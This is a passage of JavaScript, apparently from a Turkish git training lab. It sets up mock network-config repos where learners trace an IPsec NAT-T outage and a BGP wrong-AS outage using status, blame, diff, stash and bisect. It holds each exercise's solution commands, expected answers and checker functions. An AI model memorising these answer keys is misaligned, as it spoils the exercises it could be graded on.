      { a: 'ayse', d: '2026-10-13T15:27:02+02:00', m: 'edge-izm-02: allow new SNMP collector 10.0.60.30', set: { 'edge-izm-02.acl': t => t.replace(' permit udp host 10.0.50.20 host 203.0.113.66 eq snmp\n', ' permit udp host 10.0.50.20 host 203.0.113.66 eq snmp\n permit udp host 10.0.60.30 host 203.0.113.66 eq snmp\n') } },
      { a: 'burak', d: '2026-10-15T10:14:55+02:00', m: 'README: document the push procedure', set: { 'README.md': VOP_ACL.readme + "\n## Push proseduru\n\n1. ACL'i duzenle, ./check-acl.sh calistir\n2. FAIL varsa push etme\n3. Commit mesaji hostname ile baslasin\n4. Persembe change window'da push ve deploy\n" } },
    ]),
    dirty: t => t.replace(' permit tcp host 10.0.50.10 host 203.0.113.70 eq 22\n', ' permit tcp host 10.0.50.10 host 203.0.113.70 eq 22\n permit tcp host 10.0.50.15 host 203.0.113.70 eq 22\n'),
    dirtyMark: '10.0.50.15',
    notes: '17 Oct 01:10 edge-izm-02 hub tunnel down, IKE_SA_INIT ok ama IKE_AUTH hic gelmiyor\n17 Oct 01:25 ION tarafinda udp 4500 sayaci sifir, izm hatti CGNAT arkasinda, IPsec NAT-T ile akiyor\n17 Oct 01:40 ilk suphe edge ACL, persembe change window\'da push edilen degisiklikler\nTODO: hangi commit, kim, neden\n',
    fix: t => t.replace(/^ deny {3}udp any host 203\.0\.113\.66 eq 4500 log$/m, ' permit udp host 198.51.100.10 host 203.0.113.66 eq 4500'),
    fixed: t => !/deny.*udp.*eq 4500/.test(t) && t.includes(' permit udp host 198.51.100.10 host 203.0.113.66 eq 4500\n') && t.includes(' permit udp host 10.0.60.30 host 203.0.113.66 eq snmp'),
    badLine: '+ deny   udp any host 203.0.113.66 eq 4500',
  },
  b: {
    root: VOP_H + '/dc-fabric', remote: 'https://git.netlab.local/dc/dc-fabric.git', tag: 'stable-0915', script: './check-fabric.sh',
    file: 'leaf-02.conf', dirtyFile: 'leaf-03.conf', notesFile: 'leaf02-incident.txt',
    badMsg: 'leaf-02: enable BFD on spine peering, tune timers', author: 'Elif Şahin',
    commits: vopGitBuild([
      { a: 'burak', d: '2026-09-01T10:00:41+02:00', m: 'Initial commit: dc-fabric repo', set: { 'README.md': VOP_FAB.readme, '.gitignore': '*.bak\n*.log\n*.swp\n' } },
      { a: 'burak', d: '2026-09-01T10:35:12+02:00', m: 'Add fabric BGP peering policy check', set: { 'check-fabric.sh': VOP_FAB.check } },
      { a: VOP_ELIF, d: '2026-09-03T14:22:05+02:00', m: 'Add spine-01 baseline', set: { 'spine-01.conf': VOP_FAB.spine } },
      { a: VOP_ELIF, d: '2026-09-04T09:51:33+02:00', m: 'Add leaf-01 baseline', set: { 'leaf-01.conf': VOP_FAB.l1 } },
      { a: 'mehmet', d: '2026-09-08T16:40:19+02:00', m: 'Add leaf-02 baseline', set: { 'leaf-02.conf': VOP_FAB.l2 } },
      { a: 'mehmet', d: '2026-09-15T11:18:47+02:00', m: 'Add leaf-03 baseline', tag: 'stable-0915', set: { 'leaf-03.conf': VOP_FAB.l3 } },
      { a: VOP_ELIF, d: '2026-09-22T18:06:58+02:00', m: 'leaf-02: enable BFD on spine peering, tune timers', set: { 'leaf-02.conf': t => t.replace('feature bgp\n', 'feature bgp\nfeature bfd\n').replace('    remote-as 65100\n    description spine-01\n', '    remote-as 65001\n    description spine-01\n    bfd\n') } },
      { a: 'burak', d: '2026-09-29T10:44:21+02:00', m: 'spine-01: raise ibgp maximum-paths to 4', set: { 'spine-01.conf': t => t.replace('  maximum-paths ibgp 2\n', '  maximum-paths ibgp 4\n') } },
      { a: 'mehmet', d: '2026-10-06T13:37:09+02:00', m: 'leaf-02: add VLAN 130 VNI 10130 for OT historian', set: { 'leaf-02.conf': t => t.replace('vlan 120\n  vn-segment 10120\n', 'vlan 120\n  vn-segment 10120\nvlan 130\n  vn-segment 10130\n').replace('  member vni 10120\n    ingress-replication protocol bgp\n', '  member vni 10120\n    ingress-replication protocol bgp\n  member vni 10130\n    ingress-replication protocol bgp\n') } },
      { a: VOP_ELIF, d: '2026-10-13T09:25:50+02:00', m: 'leaf-01: enable BFD on spine peering', set: { 'leaf-01.conf': t => t.replace('feature bgp\n', 'feature bgp\nfeature bfd\n').replace('    description spine-01\n', '    description spine-01\n    bfd\n') } },
      { a: 'ayse', d: '2026-10-18T15:02:13+02:00', m: 'README: add fabric change checklist', set: { 'README.md': VOP_FAB.readme + '\n## Degisiklik checklist\n\n1. ./check-fabric.sh OK vermeden push yok\n2. BGP ve BFD degisikliklerinde ikinci goz review\n3. Commit mesaji hostname ile baslasin\n' } },
    ]),
    dirty: t => t.replace('hostname leaf-03\n', 'hostname leaf-03\nlogging server 10.10.0.40 6 use-vrf management\n'),
    dirtyMark: 'logging server 10.10.0.40',
    notes: '21 Oct 02:05 leaf-02 BGP EVPN session to spine-01 down, NOTIFICATION sent 2/2 (peer in wrong AS)\n21 Oct 02:06 leaf-02 arkasindaki VTEP\'ler ulasilamaz, VLAN 110 ve 120 kesik\n21 Oct 02:20 ilk suphe gecen haftaki BFD degisikligi, ama emin degiliz\nTODO: hangi commit, kim, neden\n',
    fix: t => t.replace(/^ {4}remote-as 65001$/m, '    remote-as 65100'),
    fixed: t => !/remote-as 65001/.test(t) && /^ {4}remote-as 65100$/m.test(t) && t.includes('  vn-segment 10130') && /^ {4}bfd$/m.test(t),
    badLine: '+    remote-as 65001',
  },
};
VOP_GIT.a.hashes = vopGitHashes(VOP_GIT.a.commits);
VOP_GIT.b.hashes = vopGitHashes(VOP_GIT.b.commits);
VOP_GIT.a.bad = VOP_GIT.a.hashes[VOP_GIT.a.commits.findIndex(c => c.msg === VOP_GIT.a.badMsg)];
VOP_GIT.b.bad = VOP_GIT.b.hashes[VOP_GIT.b.commits.findIndex(c => c.msg === VOP_GIT.b.badMsg)];

const vopGitState = (sh, V) => G_API.state(sh, V.root);
const vopGitBad = (sh, V) => { const st = vopGitState(sh, V); const c = st ? st.commits.find(x => x.message === V.badMsg) : null; return c ? c.hash : V.bad; };
function vopGitRun(sh, V, args) { const cwd = sh.cwd; sh.cwd = V.root; try { return LAB_EXT.commands.git.call(sh, args); } finally { sh.cwd = cwd; } }
/* Repo yoksa kurar. stage, onceki gorevler atlanmissa gerekli on kosullari tamamlar */
function vopGitEnsure(sh, V, stage) {
  if (sh.node(V.root + '/.git/lab-state.json')) return;
  G_API.createRepo(sh, V.root, V.commits, V.remote, { user: VOP_ME });
  const p = V.root + '/' + V.dirtyFile;
  G_API.write(sh, p, V.dirty(sh.node(p).d));
  G_API.write(sh, V.root + '/' + V.notesFile, V.notes);
  if (stage >= 6) vopGitRun(sh, V, ['stash']);
  if (stage >= 11) { const f = V.root + '/' + V.file; G_API.write(sh, f, V.fix(sh.node(f).d)); }
}
const vopGitSetup = (V, stage) => sh => vopGitEnsure(sh, V, stage);
function vopGitCommitted(sh, V, msgRe) {
  const st = vopGitState(sh, V); if (!st) return false;
  const h = st.commits.find(c => c.hash === st.head);
  if (!h || !h.parent) return false;
  const p = st.commits.find(c => c.hash === h.parent);
  const changed = Array.from(new Set(Object.keys(p.files).concat(Object.keys(h.files)))).filter(f => p.files[f] !== h.files[f]);
  return h.author === VOP_ME[0] && msgRe.test(h.message) && h.message.trim().length >= 15 && changed.length === 1 && changed[0] === V.file && V.fixed(h.files[V.file] || '');
}
const VOP_GA = VOP_GIT.a, VOP_GB = VOP_GIT.b;

addVariants('g1', [
  { title: 'ACL repo',
    story: "Perşembe change window'unda branch edge ACL'leri push edildi. Gece birden sonra edge-izm-02 ile hub arasındaki IPsec tunnel düştü, IKE_SA_INIT geçiyor ama sonrası gelmiyor. ACL'lerin source of truth'u ~/edge-acl repo'su. İşe repo'nun durumuna bakarak başla, commit edilmemiş ne var, kim ne bırakmış.",
    task: "edge-acl repo'suna gir ve working tree durumunu göster.",
    hint: "`cd` ile repo dizinine gir, git komutları bulunduğun dizinden yukarı doğru .git arar ve repo dışında not a git repository der. `git status` hangi branch'te olduğunu, stage edilmiş, edilmemiş ve untracked dosyaları gösterir. Bisect ya da checkout gibi geçmişte gezinen bir işe başlamadan önce bu tabloyu okumak alışkanlık olmalı.",
    solution: 'cd ~/edge-acl\ngit status',
    setup: vopGitSetup(VOP_GA, 1),
    check: (sh, c) => vopRan(c, /^git status/) && c.out.includes('On branch') && c.out.includes(VOP_GA.dirtyFile) },
  { title: 'Fabric repo',
    story: "Salı gecesi Amsterdam DC fabric'inde leaf-02 ile spine-01 arasındaki BGP EVPN session'ı düştü, leaf-02 arkasındaki VTEP'ler ulaşılamaz oldu. Leaf'in gönderdiği NOTIFICATION peer in wrong AS diyor. Fabric config'lerinin source of truth'u ~/dc-fabric repo'su. Önce repo'nun durumuna bak.",
    task: "dc-fabric repo'suna gir ve working tree durumunu göster.",
    hint: "`cd` ile repo'ya gir, git .git dizinini bulunduğun yerden yukarı doğru arar. `git status` modified, staged ve untracked dosyaları ayrı ayrı listeler ve branch'i söyler. Yarım kalmış bir değişiklik görürsen geçmişte gezinmeden önce onu ne yapacağına karar vermelisin.",
    solution: 'cd ~/dc-fabric\ngit status',
    setup: vopGitSetup(VOP_GB, 1),
    check: (sh, c) => vopRan(c, /^git status/) && c.out.includes('On branch') && c.out.includes(VOP_GB.dirtyFile) },
], { hint: "`cd` ile repo dizinine gir, git komutları bulunduğun dizinden yukarı doğru .git arar ve repo dışında not a git repository der. `git status` hangi branch'te olduğunu, stage edilmiş, edilmemiş ve untracked dosyaları gösterir. Bisect gibi geçmişte gezinen bir işe başlamadan önce bu tabloyu okumak alışkanlık olmalı." });

addVariants('g2', [
  { title: 'Kim ne push etti',
    story: "Deploy edilen şey HEAD'deki snapshot. Ondan önce kim ne commit etmiş, hangi sırayla, görmek lazım. v2.3 tag'i son stabil deploy'u işaretliyor.",
    task: 'Commit geçmişini tek satırlık formatta listele.',
    hint: "`git log` commit'leri en yeniden eskiye hash, author, tarih ve mesajla listeler. `--oneline` her commit'i kısa hash ve mesajın ilk satırıyla tek satıra indirir, uzun geçmişte göz gezdirmek için idealdir. Tag'ler commit'in yanında süslemeli olarak görünür, `--author` ile tek bir kişinin commit'lerini süzebilirsin.",
    solution: 'cd ~/edge-acl\ngit log --oneline',
    setup: vopGitSetup(VOP_GA, 2),
    check: (sh, c) => vopRan(c, /^git log/) && c.out.includes('drop NAT-T scan noise') },
  { title: 'Fabric geçmişi',
    story: "Fabric'e en son ne girdi? stable-0915 tag'i 15 Eylül'de tüm session'ların ayakta olduğu son noktayı işaretliyor. Ondan sonra kim neyi değiştirmiş, sırayla gör.",
    task: 'Commit geçmişini tek satırlık formatta listele.',
    hint: "`git log` komutuna `--oneline` verirsen geçmiş kompakt gelir, en üstte HEAD vardır. Mesajların hostname ile başlaması hangi cihaza dokunulduğunu tek bakışta söyler, bu yüzden convention önemlidir. Sadece bir dosyanın geçmişi için sona dosya adı ekleyebilirsin.",
    solution: 'cd ~/dc-fabric\ngit log --oneline',
    setup: vopGitSetup(VOP_GB, 2),
    check: (sh, c) => vopRan(c, /^git log/) && c.out.includes('enable BFD on spine peering, tune timers') },
], { hint: "`git log` commit'leri en yeniden eskiye hash, author, tarih ve mesajla listeler. `--oneline` her commit'i kısa hash ve mesajın ilk satırıyla tek satıra indirir. Tag'ler commit'in yanında görünür, `--author` ile tek bir kişinin commit'lerini süzebilirsin." });

addVariants('g3', [
  { title: 'Satırın sahibi',
    story: "Outage notlarına göre ION tarafında udp 4500 sayacı sıfır, yani edge-izm-02 NAT-T paketlerini içeri almıyor olabilir. git blame dosyanın her satırının hangi commit'ten, kimden ve ne zaman geldiğini gösterir. Satırın yanındaki hash seni doğrudan suçlu commit'e götürür.",
    task: "edge-izm-02.acl dosyasına blame çek, eq 4500 satırının yanındaki hash ve ismi not al.",
    hint: "`git blame dosya` her satırın başına o satırı son değiştiren commit'in kısa hash'ini, yazarını ve tarihini ekler. Bir satırın neden öyle olduğunu soruyorsan cevap o commit'in mesajındadır. Uzun dosyalarda `-L` ile satır aralığı vererek sadece ilgili bloğa bakabilirsin.",
    solution: 'cd ~/edge-acl\ngit blame edge-izm-02.acl',
    setup: vopGitSetup(VOP_GA, 3),
    check: (sh, c) => vopRan(c, /^git blame\b.*edge-izm-02\.acl/) && c.out.includes('eq 4500 log') },
  { title: 'Yanlış AS kimden',
    story: "NOTIFICATION peer in wrong AS diyor, demek ki leaf-02'nin spine için beklediği AS yanlış. leaf-02.conf içindeki remote-as satırını kim, hangi commit'le yazmış, blame ile bul.",
    task: "leaf-02.conf dosyasına blame çek, remote-as satırının yanındaki hash ve ismi not al.",
    hint: "`git blame` her satırın yanına onu son değiştiren commit'in hash'ini, yazarını ve tarihini koyar. Satırın kendisi yanlışsa, yanındaki hash onu getiren commit'tir, sonra `git show` ile o commit'in tamamına bakarsın. Girinti NX-OS'ta anlamlıdır, satırın hangi neighbor bloğunda olduğuna da dikkat et.",
    solution: 'cd ~/dc-fabric\ngit blame leaf-02.conf',
    setup: vopGitSetup(VOP_GB, 3),
    check: (sh, c) => vopRan(c, /^git blame\b.*leaf-02\.conf/) && c.out.includes('remote-as 65001') },
], { hint: "`git blame dosya` her satırın başına o satırı son değiştiren commit'in kısa hash'ini, yazarını ve tarihini ekler. Bir satırın neden öyle olduğunu soruyorsan cevap o commit'in mesajındadır. Uzun dosyalarda `-L` ile satır aralığı vererek sadece ilgili bloğa bakabilirsin." });

addVariants('g4', [
  { title: 'v2.3\'ten bu yana',
    story: "v2.3 tag'i 30 Eylül'deki stabil deploy'u işaretliyor, o gün tüm tunnel'lar ayaktaydı. O günden bugüne edge-izm-02.acl'de ne değişti, satır satır görelim. Eksi satırlar eski hal, artı satırlar yeni hal.",
    task: 'v2.3 ile HEAD arasında edge-izm-02.acl farkını göster.',
    hint: "`git diff` iki commit arasındaki farkı unified diff olarak verir, sona iki tire ve dosya adı eklersen sadece o dosya gösterilir. İki tire git'e bundan sonrasının ref değil path olduğunu söyler. İki nokta ile yazılan aralık gösterimi de aynı sonucu verir.",
    solution: 'cd ~/edge-acl\ngit diff v2.3 HEAD -- edge-izm-02.acl',
    setup: vopGitSetup(VOP_GA, 4),
    check: (sh, c) => vopRan(c, /^git diff\s+\S+(\.\.\.?|\s+)\S+/) && c.out.includes(VOP_GA.badLine) },
  { title: 'Stabil noktadan bu yana',
    story: "stable-0915 tag'i fabric'in son sağlam hali. O günden bugüne leaf-02.conf'ta ne değişti, satır satır gör. Birden fazla commit leaf-02'ye dokunmuş olabilir, diff hepsinin toplamını gösterir.",
    task: 'stable-0915 ile HEAD arasında leaf-02.conf farkını göster.',
    hint: "`git diff` iki ref arasındaki toplam farkı verir, aradaki commit'leri tek tek göstermez. Sona iki tire ve dosya adı koymak çıktıyı o dosyayla sınırlar. Değişen satırı gördükten sonra hangi commit'in getirdiğini blame ya da bisect söyler.",
    solution: 'cd ~/dc-fabric\ngit diff stable-0915 HEAD -- leaf-02.conf',
    setup: vopGitSetup(VOP_GB, 4),
    check: (sh, c) => vopRan(c, /^git diff\s+\S+(\.\.\.?|\s+)\S+/) && c.out.includes(VOP_GB.badLine) },
], { hint: "`git diff` iki commit arasındaki farkı unified diff olarak verir, sona iki tire ve dosya adı eklersen sadece o dosya gösterilir. İki tire git'e bundan sonrasının path olduğunu söyler. Eksi satırlar eski hal, artı satırlar yeni hal." });

addVariants('g5', [
  { title: 'Yarım iş kenara',
    story: "Suçlu commit'i kesin bulmak için git bisect kullanacağız, ama bisect her adımda eski bir snapshot'ı working tree'ye checkout eder. edge-ank-03.acl'de ikinci jump host için yarım kalmış bir değişikliğin var, checkout onu ezer, git de zaten izin vermez. Değişikliği stash'e al.",
    task: "Commit edilmemiş değişiklikleri stash'e al, working tree temiz olsun.",
    hint: "`git stash` stage edilmiş ve edilmemiş değişiklikleri bir yığına kaydeder ve dosyaları HEAD haline döndürür. Untracked dosyalar varsayılan olarak stash'e girmez, bisect'i de engellemez. İş bitince `git stash pop` ile değişikliğini geri alırsın, `git stash list` yığında ne olduğunu gösterir.",
    solution: 'cd ~/edge-acl\ngit stash',
    setup: vopGitSetup(VOP_GA, 5),
    check: (sh, c) => { const st = vopGitState(sh, VOP_GA); return vopRan(c, /^git stash\b/) && !!st && st.stash.length > 0 && !(vopText(sh, VOP_GA.root + '/' + VOP_GA.dirtyFile) || '').includes(VOP_GA.dirtyMark); } },
  { title: 'Syslog işi beklesin',
    story: "Bisect'e başlamadan working tree temiz olmalı. leaf-03.conf'ta yeni syslog collector için yarım kalmış bir satırın var. Onu silmeden kenara koy, bisect bitince geri getireceksin.",
    task: "Commit edilmemiş değişiklikleri stash'e al, working tree temiz olsun.",
    hint: "`git stash` değişikliklerini kaydedip dosyayı HEAD haline döndürür, böylece checkout güvenli olur. `-m` ile stash'e açıklama verebilirsin, birden fazla stash biriktiğinde işe yarar. Sonrasında `git status` working tree clean demeli, untracked notlar dosyası ise orada kalabilir.",
    solution: 'cd ~/dc-fabric\ngit stash\ngit status',
    setup: vopGitSetup(VOP_GB, 5),
    check: (sh, c) => { const st = vopGitState(sh, VOP_GB); return vopRan(c, /^git (stash|status)\b/) && !!st && st.stash.length > 0 && !(vopText(sh, VOP_GB.root + '/' + VOP_GB.dirtyFile) || '').includes(VOP_GB.dirtyMark); } },
], { hint: "`git stash` stage edilmiş ve edilmemiş değişiklikleri bir yığına kaydeder ve dosyaları HEAD haline döndürür, böylece checkout güvenli olur. Untracked dosyalar varsayılan olarak stash'e girmez. İş bitince `git stash pop` ile değişikliğini geri alırsın." });

addVariants('g6', [
  { title: 'Bisect ile suçlu',
    story: "İyi nokta v2.3, kötü nokta HEAD, arada beş commit var. git bisect start de, HEAD'i bad, v2.3'ü good olarak işaretle. git ortadaki commit'i checkout eder. Her adımda ./check-acl.sh çalıştır, OK derse good, FAIL derse bad. Birkaç adımda git ilk kötü commit'i söyler.",
    task: "bisect ile tunnel'ı düşüren ilk kötü commit'i bul.",
    hint: "Bisect binary search yapar, her cevabınla aday aralığı yarıya iner, bu yüzden bin commit bile on adımda biter. `git bisect bad` argümansız verilirse o an checkout edilmiş commit'i, yani başta HEAD'i işaretler, `git bisect good` ise tag ya da hash alır. Her adımda script'in çıktısına göre karar ver, tek bir yanlış good ya da bad bütün sonucu bozar.",
    solution: 'cd ~/edge-acl\ngit bisect start\ngit bisect bad\ngit bisect good v2.3\n./check-acl.sh\ngit bisect bad\n./check-acl.sh\ngit bisect bad\n./check-acl.sh\ngit bisect good',
    setup: vopGitSetup(VOP_GA, 6),
    check: (sh, c) => vopRan(c, /^git bisect/) && c.out.includes('is the first bad commit') && c.out.includes(vopGitBad(sh, VOP_GA)) },
  { title: 'Bisect run',
    story: "Bu sefer script'i her adımda elle çalıştırmayacaksın. git bisect start komutuna önce kötü sonra iyi ref'i verip aralığı tek satırda kur, sonra git bisect run ile check-fabric.sh'i her adımda git'in kendisine koşturt. Script exit 0 dönerse good, sıfırdan farklı dönerse bad sayılır.",
    task: "bisect run ile session'ı düşüren ilk kötü commit'i bul.",
    hint: "`git bisect start` iki argüman alabilir, ilki bad ikincisi good ref'tir, böylece ayrıca işaretlemen gerekmez. `git bisect run` verdiğin komutu her adımda çalıştırır ve exit code'a göre otomatik karar verir, 0 good, 1 ile 127 arası bad demek. Script'in exit code'u doğru değilse run yanlış commit'i suçlar, bu yüzden önce script'i bir kez elle denemek iyi fikir.",
    solution: 'cd ~/dc-fabric\ngit bisect start HEAD stable-0915\ngit bisect run ./check-fabric.sh',
    setup: vopGitSetup(VOP_GB, 6),
    check: (sh, c) => vopRan(c, /^git bisect/) && c.out.includes('is the first bad commit') && c.out.includes(vopGitBad(sh, VOP_GB)) },
], { hint: "Bisect binary search yapar, her cevabınla aday aralığı yarıya iner. `git bisect bad` argümansız verilirse HEAD'i işaretler, `git bisect good` ise tag ya da hash alır. Her adımda `./check-policy.sh` çıktısına göre good ya da bad de, tembel yol `git bisect run` ile script'i otomatik koşturmaktır." });

addVariants('g7', [
  { title: 'Commit\'i incele',
    story: "Suçlu belli. Önce git bisect reset ile main'e dön, HEAD hâlâ detached halde eski bir snapshot'ta duruyor. Sonra git show ile o commit'in mesajını ve diff'ini oku. Mesaj internetten gelen NAT-T gürültüsünü kesmekten bahsediyor, ama edge-izm-02 CGNAT arkasında olduğu için hub tunnel'ı zaten 4500 üzerinden akıyordu. deny satırı tunnel'ın kendisini kesmiş.",
    task: "bisect'ten çık ve kötü commit'i git show ile göster.",
    hint: "`git bisect reset` bisect öncesi bulunduğun branch'e döner ve detached HEAD durumunu bitirir. `git show` bir commit'in author, tarih, mesaj ve diff'ini birlikte gösterir, argüman olarak bisect'in verdiği hash'i ya da HEAD'e göre göreli bir ref verebilirsin. Reset'i unutursan yapacağın commit detached HEAD üzerinde kalır.",
    solution: 'cd ~/edge-acl\ngit bisect reset\ngit show ' + VOP_GA.bad,
    setup: vopGitSetup(VOP_GA, 7),
    check: (sh, c) => { const st = vopGitState(sh, VOP_GA); return vopRan(c, /^git show\b/) && c.out.includes(VOP_GA.badLine) && !!st && !st.bisect; } },
  { title: 'BFD\'nin gölgesinde',
    story: "bisect run işini bitirdi. Önce git bisect reset ile branch'e dön, sonra suçlu commit'i git show ile aç. Commit mesajı BFD açmaktan bahsediyor ve diff'in çoğu gerçekten BFD, ama arada tek bir satır daha değişmiş. Review'da gözden kaçan da o satır.",
    task: "bisect'ten çık ve kötü commit'i git show ile göster.",
    hint: "`git bisect reset` HEAD'i bisect başlamadan önceki branch'e geri getirir. `git show hash` commit'in tüm diff'ini verir, mesajın söylediğiyle diff'in yaptığını karşılaştır. Bir commit'e birden fazla mantıksal değişiklik koymak tam olarak böyle hataların review'dan kaçmasına yol açar.",
    solution: 'cd ~/dc-fabric\ngit bisect reset\ngit show ' + VOP_GB.bad,
    setup: vopGitSetup(VOP_GB, 7),
    check: (sh, c) => { const st = vopGitState(sh, VOP_GB); return vopRan(c, /^git show\b/) && c.out.includes(VOP_GB.badLine) && !!st && !st.bisect; } },
], { hint: "`git bisect reset` bisect öncesi bulunduğun branch'e döner ve detached HEAD durumunu bitirir. `git show` bir commit'in mesajını ve diff'ini birlikte gösterir, bisect'in verdiği hash'i ya da HEAD~4 gibi göreli bir ref'i argüman olarak alır. Reset'i unutursan yapacağın commit detached HEAD üzerinde kalır." });

addVariants('g8', [
  { title: 'ACL satırını düzelt',
    story: "Düzeltme tek satır, deny satırı eski permit haline dönecek. Dikkat, git checkout v2.3 -- edge-izm-02.acl dersen Ayşe'nin sonradan eklediği SNMP collector satırını da geri alırsın. Sadece ilgili satırı düzelt, nano ile ya da sed -i ile.",
    task: "edge-izm-02.acl içindeki deny udp eq 4500 satırını permit udp host 198.51.100.10 host 203.0.113.66 eq 4500 olarak düzelt, SNMP satırlarına dokunma.",
    hint: "Dosyayı `nano` ile açıp satırı elle düzeltebilir ya da `sed -i` ile yerinde değiştirebilirsin, -i değişikliği dosyanın üzerine yazar. Bütün dosyayı tag'deki haline döndürmek kolay görünür ama sonraki meşru değişiklikleri de siler. Kaynak adresi de geri koymayı unutma, any bırakırsan ACL gereğinden geniş olur.",
    solution: 'cd ~/edge-acl\nnano edge-izm-02.acl',
    editorContent: old => VOP_GA.fix(old),
    setup: vopGitSetup(VOP_GA, 8),
    check: sh => VOP_GA.fixed(vopText(sh, VOP_GA.root + '/' + VOP_GA.file) || '') },
  { title: 'AS numarasını düzelt',
    story: "Düzeltme tek satır, spine için remote-as 65001 tekrar 65100 olacak. BFD satırları doğru, onlar kalsın. Mehmet'in sonradan eklediği VLAN 130 ve VNI 10130 satırlarına da dokunma, git revert bütün commit'i geri alacağı için BFD'yi de söker.",
    task: "leaf-02.conf içindeki remote-as 65001 satırını remote-as 65100 yap, BFD ve VLAN 130 satırlarına dokunma.",
    hint: "`nano` ile dosyayı açıp rakamı düzeltebilir ya da `sed -i` ile yerinde değiştirebilirsin. Bu commit iki şey birden yapmış, revert ikisini de geri alır, burada istediğimiz sadece hatalı satırı düzeltmek. NX-OS'ta girinti blok yapısını belirler, satırın başındaki boşlukları koru.",
    solution: 'cd ~/dc-fabric\nnano leaf-02.conf',
    editorContent: old => VOP_GB.fix(old),
    setup: vopGitSetup(VOP_GB, 8),
    check: sh => VOP_GB.fixed(vopText(sh, VOP_GB.root + '/' + VOP_GB.file) || '') },
], { hint: "Dosyayı `nano` ile açıp satırı düzeltebilir ya da `sed -i` ile yerinde değiştirebilirsin, -i dosyanın üzerine yazar. `git checkout v1.0 -- dosya` bütün dosyayı geri sarar ve sonradan eklenen syslog değişikliğini de siler. `git revert` ise kötü commit'in tersini yeni bir commit olarak üretir." });

addVariants('g9', [
  { title: 'Jump host satırı geri',
    story: "Bisect bitti, working tree'de sadece senin fix'in var. Kenara koyduğun ikinci jump host satırını geri getir.",
    task: "Stash'teki değişikliği working tree'ye geri getir.",
    hint: "`git stash pop` en üstteki stash'i working tree'ye uygular ve listeden siler, `git stash apply` uygular ama listede bırakır. Pop sırasında aynı satırlarda çakışma olursa stash silinmez, önce conflict'i çözmen gerekir. `git stash list` yığında kaç kayıt olduğunu gösterir.",
    solution: 'cd ~/edge-acl\ngit stash pop',
    setup: vopGitSetup(VOP_GA, 9),
    check: (sh, c) => vopRan(c, /^git stash (pop|apply)/) && (vopText(sh, VOP_GA.root + '/' + VOP_GA.dirtyFile) || '').includes(VOP_GA.dirtyMark) },
  { title: 'Syslog satırı geri',
    story: "Fabric fix'i working tree'de hazır. Kenara koyduğun leaf-03 syslog değişikliğini geri getir, ama önce stash listesinde ne olduğuna bak.",
    task: "Stash listesini gör, sonra stash'teki değişikliği working tree'ye geri getir.",
    hint: "`git stash list` her kaydı stash@{n} adıyla, en yenisi en üstte olacak şekilde gösterir. `git stash pop` en üsttekini uygular ve siler, belirli bir kaydı istersen adını argüman olarak verirsin. Pop'tan sonra `git status` iki dosyanın modified olduğunu göstermeli, biri fix, biri syslog satırı.",
    solution: 'cd ~/dc-fabric\ngit stash list\ngit stash pop',
    setup: vopGitSetup(VOP_GB, 9),
    check: (sh, c) => vopRan(c, /^git stash (pop|apply)/) && (vopText(sh, VOP_GB.root + '/' + VOP_GB.dirtyFile) || '').includes(VOP_GB.dirtyMark) },
], { hint: "`git stash pop` en üstteki stash'i working tree'ye uygular ve listeden siler, `git stash apply` uygular ama listede bırakır. Çakışma olursa stash silinmez, önce conflict'i çözmen gerekir. `git stash list` yığında ne biriktiğini gösterir." });

addVariants('g10', [
  { title: 'Review\'a kim gelsin',
    story: "Postmortem'de değişikliği kimin yaptığı gerekiyor, suçlamak için değil, bir sonraki ACL değişikliğinde review'a kimi çağıracağını bilmek için. Bisect çıktısında ve git show'da Author satırı var, git log --format ile sadece ismi de çekebilirsin.",
    task: "Kötü commit'in author'ını submit ile gönder.",
    hint: "`git log -1` tek bir commit gösterir, sonuna hash verirsen o commit'ten başlar. `--format=%an` çıktıyı sadece author adına indirir, %ae e-postayı, %s mesajı verir. Cevabı ad ve soyad olarak submit et.",
    solution: 'cd ~/edge-acl\ngit log -1 --format=%an ' + VOP_GA.bad + '\nsubmit ' + VOP_GA.author,
    setup: vopGitSetup(VOP_GA, 10),
    check: (sh, c) => vopSub(c, 'Mehmet Demir', 'mehmet', 'mehmet@netlab.local') },
  { title: 'Fabric postmortem',
    story: "Fabric postmortem'i için remote-as hatasını getiren commit'in author'ı lazım. Amaç bir sonraki BGP değişikliğinde ikinci göz olarak kimi çağıracağını bilmek.",
    task: "Kötü commit'in author'ını submit ile gönder.",
    hint: "`git log -1 --format=%an hash` sadece author adını basar, %ae ile e-postasını da alabilirsin. `git show hash` ile de Author satırını görürsün ama format seçeneği script'lerde daha temiz. Türkçe karakterli isim yazamazsan e-posta adresini de submit edebilirsin.",
    solution: 'cd ~/dc-fabric\ngit log -1 --format=%an ' + VOP_GB.bad + '\nsubmit ' + VOP_GB.author,
    setup: vopGitSetup(VOP_GB, 10),
    check: (sh, c) => vopSub(c, 'Elif Şahin', 'Elif Sahin', 'elif', 'elif@netlab.local') },
], { hint: "`git log -1` tek bir commit gösterir, sonuna hash verirsen o commit'ten başlar. `--format=%an` çıktıyı sadece author adına indirir, %ae e-postayı verir. Cevabı ad ve soyad olarak submit et." });

addVariants('g11', [
  { title: 'Fix\'i commit\'le ve push et',
    story: "Fix working tree'de ama repo bilmiyor, repo bilmeyince Perşembe deploy'u da bilmez. Sadece edge-izm-02.acl'i stage et, jump host işin henüz bitmedi onu karıştırma. Commit mesajı repo convention'ına uysun, hostname ile başla, neyi neden düzelttiğini yaz. Sonra git push ile remote'a gönder.",
    task: "edge-izm-02.acl fix'ini anlamlı bir mesajla commit'le ve push et.",
    hint: "`git add dosya` sadece o dosyayı index'e alır, `git add .` dersen stash'ten dönen jump host değişikliği de commit'e girer. `git commit -m` mesajı tırnak içinde alır, mesajda NAT-T ya da 4500 geçsin ki altı ay sonra okuyan ne olduğunu anlasın. `git push` commit'i upstream branch'e gönderir.",
    solution: 'cd ~/edge-acl\ngit add edge-izm-02.acl\ngit commit -m "edge-izm-02: permit NAT-T udp 4500 from hub again, fixes IPsec outage"\ngit push',
    setup: vopGitSetup(VOP_GA, 11),
    check: sh => vopGitCommitted(sh, VOP_GA, /4500|nat-t|ipsec/i) },
  { title: 'Fabric fix\'i',
    story: "leaf-02 fix'ini commit'le. Sadece leaf-02.conf stage edilecek, leaf-03 syslog işi ayrı bir change. Mesaj hostname ile başlasın ve AS düzeltmesini anlatsın, sonra push et.",
    task: "leaf-02.conf fix'ini anlamlı bir mesajla commit'le ve push et.",
